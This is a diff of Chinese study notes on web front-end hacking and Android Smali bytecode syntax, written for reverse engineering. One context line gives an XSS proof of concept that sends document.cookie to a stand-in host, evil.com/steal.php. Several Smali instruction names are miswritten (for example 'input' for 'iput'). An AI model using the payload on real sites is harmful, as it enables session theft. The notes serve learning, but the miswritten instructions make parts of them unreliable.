@@ -1,4 +1,4 @@
-#  学习笔记
+# 学习笔记
 ## 1. Web前端黑客技术揭秘
 ### POC理解&学习
 1. XSS获取敏感信息：eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')
@@ -25,7 +25,7 @@
 	3. hello(Z[I[ILjava/lang/String;J)Ljava/lang/String; —\> String hello(boolean,int[],int[],String,long)
 5. Smali基本语法
 	1. .field private isFlag:z   定义变量  
-		.field button_login:Landroid/widget/Button;
+		.field button\_login:Landroid/widget/Button;
 	2. .method  方法
 		.method protected onCreate(Landroid/os/Bundle;)V  
 	3. .parameter  方法参数
@@ -49,3 +49,31 @@
 	2. If-ne（不等于）、if-lt（小于）、if-ge（大于等于）、if-gt（大于）、if-le（小于等于）
 	3. If-eqz v0:cond\_\*\* 如果V0等于0，则跳转至cond
 	4. If-nez（不等于0）、if-ltz、if-gtz、if-gez、if-lez
+7. 类的声明：
+	.class public Lcom/aaaa;
+	.super Lcom/bbbb;
+	.source “ccc.java”
+	包路径、父类、文件名称
+	\#annotations 
+	.annotation system Ldalvik/annotation/MemberClasses;
+	value={
+	Lcom/aaa$qq;
+	Lcom/aaa$bb;
+	}
+	内部类：aaa类的两个成员内部类qq和bb；
+8. 寄存器V开头的是指本地寄存器，P开头的是指参数寄存器，对于非static函数中,P0代表“this”，P1代表第一个参数，而在static函数中，P0代表第一个参数。
+	const/4 v0,0x1
+	input-boolean v0,p0,Lcom/aaa;-\>IsRegistered:Z 
+	0x1放入本地寄存器v0，input-boolean将v0的值存放在com.aaa.IsRegistered变量中。
+9. 成员变量：
+	1. .field public/private [static] [finale] varName:\<类型\> 
+	2. 不同的变量，不同的指令：iget、sget、iget-boolean、sget-boolean、iget-object、sget-object等；input、input-boolean、sput-boolean、iput-object、sput-object等；-object后缀的表示操作对象是对象类型，对boolean类的操作则使用-boolean。
+	3. Sget-object v0,Lcom/aaa;-\>ID:Ljava/lang/String; 获取com.aaa.ID的值放入V0
+	4. Iget-object v0,p0,Lcom/aaa;-\>view:Lcom/aaa/view; 此处多了一个参数p0，指的是this，array变量采用aget和aget-object
+	5. this.timer=null   
+		const/4 v3,0x0
+		sput-object v3,Lcom/aaa;-timer:Lcom/aaa/timer;
+	6. .local v0, args:Landroid/os/Message;
+		 const/4 v1, 0x12
+		 input v1, v0,Landroid/os/Message;-\>what:I
+		 此处args是Message的实例，args.what=18
